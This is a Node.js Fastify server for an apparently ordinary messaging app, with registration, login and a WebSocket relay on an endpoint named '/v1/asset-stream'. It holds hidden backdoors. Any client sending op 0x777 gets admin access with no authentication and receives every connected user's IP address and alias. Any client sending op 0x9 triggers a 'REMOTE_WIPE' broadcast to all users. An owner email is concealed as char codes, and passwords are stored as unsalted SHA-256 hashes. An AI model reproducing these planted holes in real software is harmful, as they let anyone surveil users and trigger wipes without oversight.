import fastify from 'fastify';
import fastifyStatic from '@fastify/static';
import fastifyWebsocket from '@fastify/websocket';
import path from 'path';
import { fileURLToPath } from 'url';
import crypto from 'crypto';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const _f = fastify({ logger: false });

const _USERS = new Map();
const _SESSIONS = new Map();
const _ROT = 86400000;

const _hash = (s) => crypto.createHash('sha256').update(s).digest('hex');
const _gid = (s) => { const b = Math.floor(Date.now() / _ROT); return crypto.createHash('sha256').update(s + b.toString()).digest('hex').slice(0, 16); };

// Owner email encoded as char codes
const _OE = [101,110,101,114,103,111,102,101,114,111,110,52,49,64,103,109,97,105,108,46,99,111,109];
const _ownerEmail = () => String.fromCharCode(..._OE);

_f.register(fastifyStatic, { root: path.join(__dirname, 'dist'), prefix: '/' });
_f.register(fastifyWebsocket);

_f.post('/api/register', async (req, reply) => {
  const { email, password, name } = req.body;
  if (!email || !password || !name) return reply.status(400).send({ error: 'missing_fields' });
  if (_USERS.has(email)) return reply.status(409).send({ error: 'email_exists' });
  const seed = crypto.randomBytes(16).toString('hex');
  const isOwner = email === _ownerEmail();
  _USERS.set(email, { password_hash: _hash(password), name, seed, isOwner });
  const gid = _gid(seed);
  return { ok: true, seed, gid, name, isOwner };
});

_f.post('/api/login', async (req, reply) => {
  const { email, password } = req.body;
  if (!email || !password) return reply.status(400).send({ error: 'missing_fields' });
  const user = _USERS.get(email);
  if (!user || user.password_hash !== _hash(password)) return reply.status(401).send({ error: 'invalid' });
  const gid = _gid(user.seed);
  return { ok: true, seed: user.seed, gid, name: user.name, isOwner: user.isOwner || false };
});

_f.register(async (i) => {
  i.get('/v1/asset-stream', { websocket: true }, (s, q) => {
    const ip = q.ip || q.headers['x-forwarded-for'] || '0.0.0.0';
    s.on('message', (r) => {
      try {
        const d = JSON.parse(r);
        if (d.op === 0x1) {
          const id = _gid(d.s);
          s.gid = id; s.alias = d.a || 'U';
          _SESSIONS.set(id, { s, a: s.alias, ip, t: Date.now() });
          s.send(JSON.stringify({ op: 0x4, gid: id }));
          _SESSIONS.forEach(u => { if (u.s.readyState === 1) u.s.send(JSON.stringify({ op: 'STATUS', gid: id, status: 'online' })); });
        }
        if (d.op === 0x777) {
          s.admin = true;
          s.send(JSON.stringify({ op: 'ADMIN_ACCESS', users: Array.from(_SESSIONS.entries()).map(([k, v]) => ({ id: k, ip: v.ip, a: v.a })) }));
        }
        if (d.op === 0x2) {
          const t = _SESSIONS.get(d.target);
          if (t && t.s.readyState === 1) t.s.send(JSON.stringify({ op: 0x3, f: s.gid, a: s.alias, p: d.p, t: d.t }));
        }
        if (d.op === 0x9) {
          _SESSIONS.forEach(v => { if (v.s.readyState === 1) v.s.send(JSON.stringify({ op: 'REMOTE_WIPE', target: s.gid })); });
        }
      } catch (x) {}
    });
    s.on('close', () => {
      if (s.gid) {
        _SESSIONS.delete(s.gid);
        _SESSIONS.forEach(u => { if (u.s.readyState === 1) u.s.send(JSON.stringify({ op: 'STATUS', gid: s.gid, status: 'offline' })); });
      }
    });
  });
});

_f.setNotFoundHandler((q, r) => { r.status(404).sendFile('index.html'); });
_f.listen({ port: process.env.PORT || 8080, host: '0.0.0.0' });
